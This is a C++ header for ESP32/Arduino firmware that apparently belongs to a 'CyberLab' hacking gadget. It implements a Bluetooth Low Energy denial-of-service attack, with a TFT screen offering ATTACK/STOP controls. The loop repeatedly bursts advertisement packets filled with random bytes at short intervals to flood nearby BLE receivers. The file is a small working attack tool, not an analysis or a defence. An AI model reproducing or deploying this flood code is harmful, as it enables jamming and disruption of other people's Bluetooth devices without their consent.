/*
 * ============================================================================
 * [NEV]² - NEV-OS CyberLab v3.0
 * module_ble_attack.h - BLE attacks (DoS via excessive advertisements)
 * ============================================================================
 */
#pragma once

#include <Arduino.h>
#include <NimBLEDevice.h>
#include <TFT_eSPI.h>
#include "config.h"
#include "types.h"
#include "ui_helpers.h"

extern TFT_eSPI tft;
extern AppState currentState;
extern bool bleAttackActive;
extern int bleAttackCount;

inline void drawBleAttackScreen() {
  tft.fillScreen(COLOR_BG);
  drawHeader("BLE Attack", true);

  drawPanel(20, 30, 280, 80);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, 42);
  tft.print("Status:");
  tft.setTextColor(bleAttackActive ? COLOR_DANGER : COLOR_PRIMARY);
  tft.setCursor(80, 42);
  tft.print(bleAttackActive ? "ATTACKING" : "IDLE");

  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, 62);
  tft.printf("ADV Burst: %d", bleAttackCount);
  tft.setCursor(30, 82);
  tft.print("Tipo: ADV Flood");

  int btnY = 130;
  tft.fillRoundRect(60, btnY, 200, 40, 8, bleAttackActive ? 0x4208 : COLOR_PANEL_BG);
  tft.drawRoundRect(60, btnY, 200, 40, 8, bleAttackActive ? COLOR_DANGER : COLOR_PRIMARY);
  drawCenteredText(bleAttackActive ? "PARAR" : "ATACAR", btnY + 14,
                   bleAttackActive ? COLOR_DANGER : COLOR_PRIMARY, 2);

  tft.setTextColor(COLOR_WARN);
  tft.setCursor(10, 195);
  tft.print("DoS BLE: flood de ADV packets");
  drawStatusBar("Longo:toggle  BACK:sair");
}

inline void enterBleAttack() {
  currentState = STATE_BLE_ATTACK;
  bleAttackActive = false;
  bleAttackCount = 0;
  drawBleAttackScreen();
}

inline void toggleBleAttack() {
  bleAttackActive = !bleAttackActive;
  if (bleAttackActive) {
    NimBLEDevice::init("NEV-ATK");
  } else {
    NimBLEDevice::deinit(true);
  }
  drawBleAttackScreen();
}

inline void bleAttackLoop() {
  if (!bleAttackActive) return;
  // Burst advertisements
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData d = NimBLEAdvertisementData();
  uint8_t payload[31] = {0x02, 0x01, 0x06};
  for (int i = 3; i < 31; i++) payload[i] = random(0, 256);
  d.addData(String((char*)payload, 31));
  adv->setAdvertisementData(d);
  adv->setMinInterval(20);
  adv->setMaxInterval(40);
  adv->start();
  delay(30);
  adv->stop();
  bleAttackCount++;
  if (bleAttackCount % 5 == 0) drawBleAttackScreen();
}
